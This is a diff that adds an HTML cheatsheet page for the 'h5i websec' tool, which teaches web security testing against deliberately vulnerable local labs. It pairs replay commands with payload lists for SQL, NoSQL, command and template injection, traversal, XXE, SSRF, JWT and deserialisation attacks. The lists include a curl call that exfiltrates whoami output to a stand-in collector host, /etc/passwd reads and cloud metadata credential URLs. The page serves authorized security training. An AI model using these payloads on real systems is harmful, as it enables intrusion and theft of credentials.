@@ -1,0 +1,266 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>h5i websec cheatsheet | h5i</title><meta name="description" content="One page of h5i websec reference: the capture and replay loop, every --set target, the replay flags, and probe values by class.">
+<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
+<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://h5i.dev/guides/cheatsheet/"><link rel="icon" type="image/png" href="/_static/logo.png">
+<meta property="og:type" content="article"><meta property="og:site_name" content="h5i">
+<meta property="og:title" content="h5i websec cheatsheet | h5i"><meta property="og:description" content="One page of h5i websec reference: the capture and replay loop, every --set target, the replay flags, and probe values by class.">
+<meta property="og:url" content="https://h5i.dev/guides/cheatsheet/"><meta property="og:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta property="og:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved"><meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="h5i websec cheatsheet | h5i">
+<meta name="twitter:description" content="One page of h5i websec reference: the capture and replay loop, every --set target, the replay flags, and probe values by class."><meta name="twitter:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta name="twitter:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "Cheatsheet",
+      "description": "One page of h5i websec reference: the capture and replay loop, every --set target, the replay flags, and probe values by class.",
+      "author": {
+        "@type": "Organization",
+        "name": "h5i-dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "h5i"
+      },
+      "datePublished": "2026-09-15",
+      "dateModified": "2026-09-15",
+      "image": "https://h5i.dev/_static/sandboxed-browser-ui.png",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://h5i.dev/#website"
+      },
+      "mainEntityOfPage": "https://h5i.dev/guides/cheatsheet/"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://h5i.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://h5i.dev/guides/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Cheatsheet",
+          "item": "https://h5i.dev/guides/cheatsheet/"
+        }
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "How is a --set value parsed?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "The value is everything after the first =, so a payload full of = needs no escaping. A value that parses as JSON is sent as JSON, so json.admin=true is a boolean and json.admin=\"true\" is the string."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Which flag do loops forget?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "--reset-budget. Each page has a bounded network allowance, and without it a long loop stops partway while every later probe reads as a negative result."
+          }
+        }
+      ]
+    }
+  ]
+}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&amp;family=Space+Grotesk:wght@300;400;500;700&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/_static/blog.css?v=20ea6351e0"><link rel="stylesheet" href="/_static/highlight.css?v=45984d5155">
+</head>
+<body><nav class="blog-nav">
+  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
+  <ul class="nav-links">
+    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
+    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
+    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
+  </ul>
+</nav><main class="article-wrap"><article class="post">
+<header><div class="post-eyebrow">Reference / websec &middot; 2026-09-15</div>
+<h1>Cheatsheet</h1><p class="post-deck">One page. Print it, or keep it open beside the labs.</p>
+<div class="post-meta"><span>5 min read</span><span>Cheatsheet &middot; websec &middot; Reference</span></div></header>
+<div class="callout"><strong>The reference card for the h5i web security tutorial.</strong>
+The labs it refers to are 42 deliberately vulnerable applications you run on your own machine,
+in <a href="https://github.com/h5i-dev/h5i-tutorial">h5i-dev/h5i-tutorial</a>.
+Use h5i only against systems you own or are explicitly authorized to test.</div>
+<h2 id="the-loop">The loop</h2>
+<pre><code class="language-bash">h5i browser open URL --session s --new --capture     # 1. capture
+h5i websec requests --session s --human              # 2. read the record
+h5i websec show res_0 --session s --raw              #    read one message
+h5i websec replay req_0 --session s --set TARGET=V   # 3. change one thing
+h5i websec diff res_0 res_1 --session s --human      # 4. compare
+h5i websec match res_1 --session s --contains X      #    assert (exit 0/1/2)
+h5i browser close --session s
+</code></pre>
+<p>Body of a replay's answer, in two calls:</p>
+<pre><code class="language-bash">SEQ=$(h5i websec replay req_0 --session s --set … | jq -r .seq)
+h5i websec show &quot;res_$SEQ&quot; --session s --raw
+</code></pre>
+<hr />
+<h2 id="-set-targets"><code>--set</code> targets</h2>
+<pre><code>method=POST                       url=http://other/x        path=/admin
+query.&lt;name&gt;=                     header.&lt;name&gt;=            cookie.&lt;name&gt;=
+json.&lt;a.b.0.c&gt;=                   form.&lt;name&gt;=              body.raw=
+multipart.&lt;part&gt;=                 multipart.&lt;part&gt;.filename=
+multipart.&lt;part&gt;.content-type=
+</code></pre>
+<ul>
+<li>value = everything after the <strong>first</strong> <code>=</code></li>
+<li>a value that parses as JSON is sent as JSON: <code>json.admin=true</code> (boolean),
+  <code>json.p={"$gt":""}</code> (object), <code>json.t=["a"]</code> (array), <code>json.admin="true"</code> (string)</li>
+<li><code>--create</code> to add, <code>--unset</code> to remove, <code>--set-file T=PATH</code> for bytes</li>
+</ul>
+<h2 id="replay-flags">Replay flags</h2>
+<pre><code>--create           add a target that is not there
+--set-file T=PATH  the value is the file's bytes (images, polyglots)
+--as SESSION       send from another session's jar        [Lab 08]
+--keep-credentials carry Cookie/Authorization with --as
+--repeat N         N sends, with median + MAD timing      [Lab 14]
+--race             release the repeats together           [Lab 35]
+--no-follow        stop at the redirect and report it     [Lab 24]
+--reset-budget     restart the page allowance — USE IN LOOPS [Lab 06]
+--raw-target T     request-target byte for byte           [Lab 27]
+--raw-request F    whole message byte for byte            [Lab 30]
+</code></pre>
+<h2 id="other-verbs">Other verbs</h2>
+<pre><code>h5i websec requests --method/--status/--url-contains/--initiator/--denied-only/--limit
+h5i websec show ID --raw | --body-to PATH
+h5i websec sitemap
+h5i websec match ID --status/--contains/--regex/--json-path/--header/--longer-than/--shorter-than
+h5i websec sequence FILE --var N=V [--keep-going]         [Lab 41]
+h5i websec socket ws://… --send FRAME --wait-ms MS        [Lab 34]
+h5i browser requests            # includes what policy DENIED
+h5i browser snapshot | markdown | click @e3 | type @e5 &quot;x&quot; | navigate URL
+</code></pre>
+<hr />
+<h2 id="probe-values-by-class">Probe values, by class</h2>
+<p><strong>Injection canaries</strong> (send once per parameter; watch status, size, time):</p>
+<pre><code>'    &quot;    \    `    ;    |    &amp;    &lt;    &gt;    ${7*7}    {{7*7}}    ../    %00
+</code></pre>
+<p><strong>SQL</strong> — [Labs 12–14, 19]</p>
+<pre><code>'                          break it
+' AND '1'='1  /  '1'='2    prove the logic changed
+' ORDER BY 3 --            count columns
+' UNION SELECT 1,2,3 --    read
+' AND (SELECT unicode(substr(x,1,1)) FROM t) &gt; 77 --      boolean oracle
+' OR (SELECT CASE WHEN (…) THEN sleep(1) ELSE 0 END) --   timing oracle
+schema: sqlite_master | information_schema.tables | pg_tables | sys.tables
+comment: `-- ` (with the space) | # | /**/
+</code></pre>
+<p><strong>NoSQL / type confusion</strong> — [Labs 09, 15]</p>
+<pre><code>{&quot;$gt&quot;: &quot;&quot;}   {&quot;$ne&quot;: null}   {&quot;$regex&quot;: &quot;^a&quot;}   {&quot;$in&quot;: [...]}
+?p[$ne]=1      ?a[]=x&amp;a[]=y      true vs &quot;true&quot;      1 vs &quot;1&quot;
+</code></pre>
+<p><strong>Command</strong> — [Labs 16, 34]</p>
+<pre><code>; id      | id      &amp;&amp; id      $(id)      `id`      %0a id
+${IFS} for spaces      {cat,/etc/passwd}      c''at
+close the quote first:  x'; id; echo '
+blind: ; sleep 5;   |   ; curl http://collector/$(whoami);
+</code></pre>
+<p><strong>Template (SSTI)</strong> — [Labs 17, 29]</p>
+<pre><code>{{7*7}}  {{7*'7'}}  ${7*7}  #{7*7}  &lt;%= 7*7 %&gt;
+python: obj.__init__.__globals__[&quot;SECRET&quot;]
+        ''.__class__.__mro__[1].__subclasses__()
+jinja:  {{ cycler.__init__.__globals__.os.popen('id').read() }}  {{ config }}
+</code></pre>
+<p><strong>Traversal / LFI</strong> — [Labs 27, 29]</p>
+<pre><code>../  ..%2f  %2e%2e%2f  %252e%252e%252f  ..%c0%af  ....//
+targets: /etc/passwd  /proc/self/environ  /proc/self/cmdline  access.log  .env
+--raw-target when the encoding IS the payload
+</code></pre>
+<p><strong>XXE</strong> — [Lab 18]</p>
+<pre><code class="language-xml">&lt;!DOCTYPE r [ &lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
+blind: parameter entity + external DTD on your host
+</code></pre>
+<p><strong>SSRF</strong> — [Labs 25, 26]</p>
+<pre><code>127.0.0.1 → 2130706433 | 0x7f000001 | 017700000001 | 127.1 | 0 | [::1]
+169.254.169.254/latest/meta-data/iam/security-credentials/
+metadata.google.internal/computeMetadata/v1/  (+ Metadata-Flavor: Google)
+also: file:// gopher:// dict://, a redirect you control, DNS rebinding
+</code></pre>
+<p><strong>JWT</strong> — [Labs 10, 11]</p>
+<pre><code>alg: none (trailing dot)   |  crack a weak HS256 secret
+RS256→HS256 (public key as the HMAC key)
+kid: ../static/known.txt   |  jku/x5u pointing at your JWKS
+missing exp / iss / aud checks
+</code></pre>
+<p><strong>Serialisation</strong> — [Lab 40]</p>
+<pre><code>\x80\x04  pickle      rO0AB / \xac\xed  Java      O:8:&quot;  a:2:{  PHP
+AAEAAAD/////  .NET      !!python/object/apply:  YAML   {&quot;$type&quot;:  Json.NET
+</code></pre>
+<p><strong>Origin / redirect validation</strong> — [Labs 23, 24]</p>
+<pre><code>https://ok.example.evil.test        prefix check
+https://evilok.example              suffix check
+https://evil.test/?x=ok.example     substring check
+https://ok.example@evil.test        userinfo
+//evil.test    http://ok.example:9999    Origin: null
+an open redirect ON the allowed origin
+</code></pre>
+<p><strong>Headers worth sweeping</strong> — [Labs 23, 29, 32, 33]</p>
+<pre><code>Host  X-Forwarded-Host  X-Forwarded-For  X-Forwarded-Proto  X-Original-URL
+X-Rewrite-URL  Origin  Referer  User-Agent  True-Client-IP  Via  X-Api-Version
+</code></pre>
+<p><strong>Mass-assignment field names</strong> — [Lab 09]</p>
+<pre><code>is_admin isAdmin admin role roles is_staff is_superuser verified confirmed
+active enabled credits balance quota plan tier owner_id user_id tenant_id
+organization_id id uuid password_hash mfa_enabled
+</code></pre>
+<p><strong>CRLF</strong> — [Lab 31] carry real bytes: <code>$'\r\n'</code> in a JSON field, or
+<code>--raw-target</code> / <code>--raw-request</code>. End the header block (<code>\r\n\r\n</code>) rather
+than fighting duplicate-header precedence.</p>
+<hr />
+<h2 id="the-four-questions-for-any-endpoint">The four questions for any endpoint</h2>
+<ol>
+<li><strong>Who</strong> — replay it as every other actor (<code>--as</code>, no credential at all)</li>
+<li><strong>What</strong> — change every identifier, and every field's <em>type</em></li>
+<li><strong>How</strong> — change the method, the <code>Content-Type</code>, the path's spelling, the API version</li>
+<li><strong>When</strong> — send it twice, send it out of order, send twenty at once (<code>--race</code>)</li>
+</ol>
+<hr />
+<h2 id="reading-a-sweep">Reading a sweep</h2>
+<pre><code class="language-bash">for v in …; do
+  h5i websec replay req_0 --session s --reset-budget --set query.x=&quot;$v&quot; |
+    python3 -c 'import json,sys;r=json.load(sys.stdin);s=r[&quot;response&quot;]
+print(s[&quot;status&quot;], s[&quot;bytes&quot;], r[&quot;samples&quot;][0][&quot;total_ms&quot;])'
+done | sort | uniq -c
+</code></pre>
+<p>Status, size, time. The outlier is the finding.</p>
+<hr />
+<h2 id="when-something-does-not-work">When something does not work</h2>
+<pre><code>payload had no effect      →  websec show req_N --raw   (did it leave as written?)
+everything returns the same →  h5i browser requests     (did policy refuse it?)
+a loop goes quiet          →  --reset-budget
+--set refused              →  --create
+a value became a string    →  it did not parse as JSON — check the quoting
+% got re-encoded           →  --raw-target
+framing headers rewritten  →  --raw-request
+a page script did nothing  →  --script on the session
+a socket said nothing      →  raise --wait-ms
+</code></pre>
+<h2 id="faq">Questions that come up</h2><div class="faq-list"><details class="faq-item"><summary>How is a --set value parsed?</summary><div class="faq-answer">The value is everything after the first =, so a payload full of = needs no escaping. A value that parses as JSON is sent as JSON, so json.admin=true is a boolean and json.admin="true" is the string.</div></details><details class="faq-item"><summary>Which flag do loops forget?</summary><div class="faq-answer">--reset-budget. Each page has a bounded network allowance, and without it a long loop stops partway while every later probe reads as a negative result.</div></details></div>
+<a class="next-up" href="/guides/authorized-web-security-testing/"><span class="label">Put it to work</span><h3>Run an authorized web security test with an AI agent</h3><p>Scope a session to a target you may test, then capture, enumerate, replay, and report.</p></a>
+<div class="post-cta"><h3>The full command reference</h3><p>Every flag on this page, with its exit codes and limits.</p>
+<div class="hero-actions"><a class="btn btn-primary" href="/manual/#h5i-websec">Open the manual</a></div></div>
+</article></main><footer class="blog-footer"><div class="blog-footer-inner">
+  <div class="brand">h5i<span class="red"> / high-five</span></div>
+  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
+  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
+</div></footer>
+<script src="/_static/blog.js?v=41dbda103a" defer></script><script src="/_static/highlight.js?v=ed81eee4e6" defer></script></body></html>
